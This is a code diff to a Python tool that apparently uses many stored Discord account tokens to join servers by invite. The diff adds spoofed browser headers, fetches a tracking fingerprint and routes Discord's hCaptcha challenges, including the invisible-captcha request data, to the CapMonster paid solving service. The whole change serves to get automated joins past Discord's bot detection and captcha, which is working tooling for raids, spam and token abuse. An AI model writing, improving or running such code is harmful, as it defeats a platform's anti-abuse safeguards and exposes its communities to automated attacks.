@@ -11,7 +11,7 @@ logIdBotClass = {}
 stops = []
 failedChannels = []
 DISCORD_API_BASE_URL= "https://discord.com/api/v9"
-USER_AGENT = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36"
+USER_AGENT = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36"
 
 class DiscordApis():
     def __init__(self, logId:str, token:str):
@@ -24,7 +24,31 @@ class DiscordApis():
         headers = {
             "user-agent":USER_AGENT,
             "Authorization":self.token,
-            "x-super-properties":self.generateXSuperProperties()
+            "x-super-properties":self.generateXSuperProperties(),
+            "accept": "*/*",
+            "accept-language": "ja-JP",
+            "connection": "keep-alive",
+            "DNT": "1",
+            "origin": "https://discord.com",
+            "sec-fetch-dest": "empty",
+            "sec-fetch-mode": "cors",
+            "sec-fetch-site": "same-origin",
+            "referer": "https://discord.com/channels/@me",
+            "TE": "Trailers",
+        }
+        return headers
+    def generateFingerHeaders(self):
+        headers = {
+            'Accept': '*/*',
+            'Accept-Language': 'ja-JP',
+            'Connection': 'keep-alive',
+            'Referer': 'https://discord.com/',
+            'Sec-Fetch-Dest': 'empty',
+            'Sec-Fetch-Mode': 'cors',
+            'Sec-Fetch-Site': 'same-origin',
+            'Sec-GPC': '1',
+            'User-Agent': USER_AGENT,
+            'X-Track': self.generateXSuperProperties(),
         }
         return headers
     def getUserInfo(self):
@@ -33,14 +57,20 @@ class DiscordApis():
     def hcaptchaSolver(self, apikey:str, sitekey:str, data:str, siteUrl="https://discord.com"):
         try:
             capmonster = HCaptchaTask(apikey)
-            taskId = capmonster.create_task(siteUrl, sitekey)
+            capmonster.set_user_agent(USER_AGENT)
+            print(data)
+            taskId = capmonster.create_task(siteUrl, sitekey, is_invisible=True, custom_data=data, )
             result = capmonster.join_task_result(taskId)
             return result.get("gRecaptchaResponse")
         except Exception as e:
             logs[self.logId] += f"[-]Captcha Failed - {str(datetime.datetime.now())} {str(e)} JoinGuild Token: "+base64.b64encode(self.getUserInfo()[1]["id"].encode()).decode()+"\n"
             return None
     def joinGuild(self, inviteCode:str, capmonsterApiKey=""):
-        res = requests.post(f"{DISCORD_API_BASE_URL}/invites/{inviteCode}", headers=self.generateHeaders())
+        headers = self.generateHeaders()
+        res = requests.get('https://discord.com/api/v9/experiments', headers=self.generateFingerHeaders())
+        fingerprint = res.json()["fingerprint"]
+        headers["x-fingerprint"] = fingerprint
+        res = requests.post(f"{DISCORD_API_BASE_URL}/invites/{inviteCode}", headers=headers)
         if str(res.status_code)[0] == "2":
             logs[self.logId] += f"[+]Success - {str(datetime.datetime.now())} JoinGuild Token: "+base64.b64encode(self.getUserInfo()[1]["id"].encode()).decode()+"\n"
             return True
@@ -49,11 +79,13 @@ class DiscordApis():
             solverResult = self.hcaptchaSolver(capmonsterApiKey, str(res.json()["captcha_sitekey"]), res.json()["captcha_rqdata"])
             if not solverResult:
                 return False
-            appendHeaders = {
-                "X-Captcha-Key":solverResult,
-                "X-Captcha-Rqtoken":res.json()["captcha_rqtoken"]
+            payload = {
+                "captcha_key":solverResult,
+                "captcha_rqtoken":res.json()["captcha_rqtoken"]
             }
-            res = requests.post(f"{DISCORD_API_BASE_URL}/invites/{inviteCode}", headers=self.generateHeaders()+appendHeaders)
+            res = requests.post(f"{DISCORD_API_BASE_URL}/invites/{inviteCode}", headers=headers, json=payload)
+            print(headers, "\n", payload)
+            print(res)
             if str(res.status_code)[0] == "2":
                 logs[self.logId] += f"[+]Success - {str(datetime.datetime.now())} JoinGuild Token: "+base64.b64encode(self.getUserInfo()[1]["id"].encode()).decode()+"\n"
                 return True
